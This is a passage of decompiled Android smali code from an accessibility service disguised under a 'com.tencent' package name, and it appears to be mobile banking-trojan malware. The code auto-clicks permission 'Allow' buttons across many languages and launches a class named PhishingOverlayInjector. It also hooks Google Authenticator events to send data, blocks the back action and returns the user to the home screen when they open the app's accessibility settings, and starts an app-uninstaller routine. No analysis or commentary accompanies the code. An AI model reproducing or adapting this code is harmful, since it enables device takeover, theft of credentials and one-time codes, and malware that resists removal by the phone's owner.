    goto :goto_13

    .line 2327
    :cond_39
    :try_start_c
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setFocusable(Z)V

    .line 2328
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setClickable(Z)V

    .line 2329
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    sget-object v3, Lcom/tencent/AccessibilityServiceCore;->Fakeparams_bass:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2330
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    sget-object v3, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    sget-object v4, Lcom/tencent/AccessibilityServiceCore;->Fakeparams_bass:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v2, v3, v4}, Landroid/view/WindowManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_7

    .line 2385
    :catch_7
    :cond_3a
    :goto_13
    :try_start_d
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3b

    .line 2387
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012pasteText()V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_8

    :catch_8
    :cond_3b
    :goto_14
    move-object/from16 v3, p1

    goto :goto_16

    .line 2395
    :cond_3c
    :try_start_e
    sget-object v2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-nez v2, :cond_3d

    .line 2396
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sput-object v2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    .line 2398
    :cond_3d
    sget-object v2, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-nez v2, :cond_3e

    .line 2399
    sput-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_9

    .line 2406
    :catch_9
    :cond_3e
    :try_start_f
    sget-boolean v2, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    if-eqz v2, :cond_3f

    .line 2407
    invoke-direct/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendNotifi(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 2409
    :cond_3f
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    goto :goto_14

    .line 2419
    :cond_40
    sget-boolean v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendGoogleAuth:Z

    if-eqz v2, :cond_41

    .line 2420
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8

    move-object/from16 v3, p1

    :try_start_10
    invoke-static {v3, v2}, Lcom/tencent/DataPackagingEngine;->_SGA2(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V

    goto :goto_15

    :cond_41
    move-object/from16 v3, p1

    .line 2422
    :goto_15
    sget-boolean v2, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    if-eqz v2, :cond_42

    .line 2423
    invoke-virtual/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ActivSend(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 2427
    :cond_42
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_IN:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_43

    .line 2429
    invoke-direct {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v2

    if-eqz v2, :cond_43

    const/4 v2, 0x0

    .line 2431
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_IN:Ljava/lang/Boolean;

    const-wide/16 v4, 0x64

    .line 2432
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 2433
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_a

    .line 2446
    :catch_a
    :cond_43
    :goto_16
    :try_start_11
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v2, :cond_44

    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v2, :cond_44

    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_d

    if-eqz v2, :cond_4f

    :cond_44
    if-nez v1, :cond_45

    return-void

    .line 2460
    :cond_45
    :try_start_12
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_46

    const-string v2, "Start Now"

    .line 2462
    invoke-static {v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 2465
    :cond_46
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_47

    const-string v2, "Allow"

    .line 2467
    invoke-static {v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    :cond_47
    const/4 v2, 0x5

    new-array v4, v2, [Ljava/lang/String;

    const-string v2, "com.android.packageinstaller:id/permission_allow_button"

    const/4 v5, 0x0

    aput-object v2, v4, v5

    const-string v2, "android:id/button1"

    const/4 v5, 0x1

    aput-object v2, v4, v5

    const-string v2, "com.android.settings:id/action_button"

    const/4 v5, 0x2

    aput-object v2, v4, v5

    const-string v2, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const/4 v5, 0x3

    aput-object v2, v4, v5

    const-string v2, "com.android.permissioncontroller:id/permission_allow_button"

    const/4 v5, 0x4

    aput-object v2, v4, v5

    const/4 v2, 0x0

    :goto_17
    const/4 v5, 0x5

    if-ge v2, v5, :cond_4a

    .line 2481
    aget-object v5, v4, v2

    invoke-virtual {v1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_18
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_49

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 2482
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_48

    const-string v7, "\u5378\u8f7d"

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_48

    return-void

    :cond_48
    const/16 v7, 0x10

    .line 2485
    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 v6, 0x0

    .line 2486
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    sput-object v7, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    goto :goto_18

    :cond_49
    add-int/lit8 v2, v2, 0x1

    goto :goto_17

    :cond_4a
    const/4 v2, 0x3

    new-array v4, v2, [Ljava/lang/String;

    const-string v2, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const/4 v5, 0x0

    aput-object v2, v4, v5

    const-string v2, "android:id/button1"

    const/4 v5, 0x1

    aput-object v2, v4, v5

    const-string v2, "com.android.permissioncontroller:id/permission_allow_button"

    const/4 v5, 0x2

    aput-object v2, v4, v5

    const/4 v2, 0x0

    :goto_19
    const/4 v5, 0x3

    if-ge v2, v5, :cond_4d

    .line 2493
    aget-object v5, v4, v2

    invoke-virtual {v1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_1a
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_4c

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 2494
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_4b

    const-string v7, "\u5378\u8f7d"

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4b

    return-void

    :cond_4b
    const/16 v7, 0x10

    .line 2497
    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 v6, 0x0

    .line 2498
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    sput-object v7, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    goto :goto_1a

    :cond_4c
    add-int/lit8 v2, v2, 0x1

    goto :goto_19

    :cond_4d
    const/16 v2, 0xd

    new-array v2, v2, [Ljava/lang/String;

    const-string v4, "\u672c\u6b21"

    const/4 v5, 0x0

    aput-object v4, v2, v5

    const-string v4, "Once"

    const/4 v5, 0x1

    aput-object v4, v2, v5

    const-string v4, "\u0f50\u0f7a\u0f44\u0f66\u0f0b\u0f60\u0f51\u0f72\u0f62\u0f0b\u0f60\u0f41\u0f7c\u0f62\u0f0b\u0f66\u0f90\u0fb1\u0f7c\u0f51\u0f0b\u0f56\u0fb1\u0f7a\u0f51\u0f0b\u0f46\u0f7c\u0f42"

    const/4 v5, 0x2

    aput-object v4, v2, v5

    const-string v4, "kali"

    const/4 v5, 0x3

    aput-object v4, v2, v5

    const-string v4, "l\u1ea7n"

    const/4 v5, 0x4

    aput-object v4, v2, v5

    const-string v4, "\u1010\u1005\u103a\u1000\u103c\u102d\u1019\u103a"

    const/4 v5, 0x5

    aput-object v4, v2, v5

    const-string v4, "\u59cb\u7ec8"

    const/4 v5, 0x6

    aput-object v4, v2, v5

    const-string v4, "Allow"

    const/4 v5, 0x7

    aput-object v4, v2, v5

    const-string v4, "time"

    const/16 v5, 0x8

    aput-object v4, v2, v5

    const-string v4, "\u0f51\u0f0b\u0f51\u0f7a\u0f0b\u0f46\u0f7c\u0f42"

    const/16 v5, 0x9

    aput-object v4, v2, v5

    const-string v4, "izinkan"

    const/16 v5, 0xa

    aput-object v4, v2, v5

    const-string v4, "Ch\u1ea5p nh\u1eadn"

    const/16 v5, 0xb

    aput-object v4, v2, v5

    const-string v4, "\u1001\u103d\u1004\u1037\u103a\u1015\u103c\u102f\u1015\u102b"

    const/16 v5, 0xc

    aput-object v4, v2, v5

    .line 2505
    invoke-static {v2}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v2

    .line 2507
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_1b
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_4f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    .line 2508
    invoke-virtual {v1, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    .line 2510
    invoke-interface {v4}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_4e

    const/4 v5, 0x0

    .line 2511
    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 2513
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_4e

    const/16 v6, 0x10

    .line 2514
    invoke-virtual {v4, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 2515
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_b

    goto :goto_1b

    :cond_4e
    const/16 v6, 0x10

    goto :goto_1b

    .line 2530
    :catch_b
    :cond_4f
    :try_start_13
    sget-boolean v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z

    if-eqz v1, :cond_54

    .line 2532
    invoke-static {}, Lcom/tencent/DataPackagingEngine;->PERMISSIONS()[Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/tencent/DataPackagingEngine;->H__tunesxconcerningn1011_P(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_53

    const/4 v1, 0x0

    .line 2534
    sput-boolean v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_d

    .line 2536
    :try_start_14
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/tencent/PhishingOverlayInjector;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x40000000    # 2.0f

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_c

    return-void

    :catch_c
    const/4 v1, 0x1

    .line 2540
    :try_start_15
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2541
    :goto_1c
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_50

    const/4 v1, 0x0

    .line 2547
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    move-object v1, v2

    goto :goto_1c

    .line 2556
    :cond_50
    :goto_1d
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_51

    const/4 v1, 0x0

    .line 2562
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    move-object v1, v2

    goto :goto_1d

    .line 2571
    :cond_51
    :goto_1e
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_52

    const/4 v1, 0x0

    .line 2577
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    move-object v1, v2

    goto :goto_1e

    .line 2586
    :cond_52
    :goto_1f
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_54

    const/4 v1, 0x0

    .line 2592
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    move-object v1, v2

    goto :goto_1f

    :cond_53
    const/4 v1, 0x1

    .line 2607
    sput-boolean v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z

    .line 2612
    :cond_54
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012bypass:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_58

    sget-boolean v1, Lcom/tencent/AccessibilityServiceCore;->ifFinishiInitPermission:Z

    if-eqz v1, :cond_58

    sget-boolean v1, Lcom/tencent/AutoPermissionGranter;->ifFinishAll:Z

    if-eqz v1, :cond_58

    .line 2615
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "["

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 2616
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    .line 2619
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    const-string v4, "com.android.settings.SubSettings"

    .line 2620
    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_56

    .line 2621
    invoke-virtual/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_55

    invoke-virtual/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_56

    .line 2623
    :cond_55
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 2624
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 2633
    :cond_56
    invoke-virtual/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    .line 2638
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    .line 2639
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    const-string v4, "Accessibility"

    .line 2640
    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_57

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_57

    .line 2641
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 2642
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    :cond_57
    const-string v4, "Accessibility"

    .line 2646
    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_58

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_58

    .line 2647
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 2648
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_d

    :catch_d
    :cond_58
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x26c1db68 -> :sswitch_3
        0x28566a9f -> :sswitch_2
        0x449cc9ab -> :sswitch_1
        0x5ff026c4 -> :sswitch_0
    .end sparse-switch
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onServiceConnected()V
    .locals 19

    move-object/from16 v0, p0

    .line 3382
    invoke-super/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 3384
    invoke-static/range {p0 .. p0}, Lcom/tencent/LoadingScreenOverlay;->show(Lcom/tencent/AccessibilityServiceCore;)V

    .line 3385
    invoke-static/range {p0 .. p0}, Lcom/tencent/AppUninstallerEngine;->start(Lcom/tencent/AccessibilityServiceCore;)V

    .line 3386
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->subescribeDbevicbeList()V

    .line 3387
    invoke-static {}, Lcom/tencent/LanguageManager;->initLanguage()V

    .line 3388
    invoke-direct/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->unlockScreenListen()V

    .line 3390
    :try_start_0
    new-instance v1, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v1}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    const/16 v2, 0x73

    .line 3391
    iput v2, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const/4 v2, -0x1

    .line 3392
    iput v2, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const-wide/16 v3, 0x0

    .line 3393
    iput-wide v3, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    const/4 v3, 0x0

    .line 3394
    iput-object v3, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->packageNames:[Ljava/lang/String;

    .line 3395
    iput v2, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    .line 3396
    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 3401
    :catch_0
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/tencent/AccessibilityServiceCore;->getApplicationName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->CurrentName:Ljava/lang/String;

    .line 3404
    :try_start_1
    sput-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    .line 3405
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    const-string v1, "window"

    .line 3407
    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    .line 3408
    new-instance v2, Landroid/widget/FrameLayout;

    invoke-direct {v2, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    .line 3410
    new-instance v2, Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x1

    const/4 v5, 0x1

    const/16 v6, 0x7f0

    const v7, -0x7fb3fb68

    const/4 v8, -0x3

    move-object v3, v2

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const/16 v3, 0x30

    .line 3411
    iput v3, v2, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 3412
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012lay:Landroid/view/WindowManager$LayoutParams;

    .line 3413
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    .line 3418
    new-instance v2, Landroid/widget/FrameLayout;

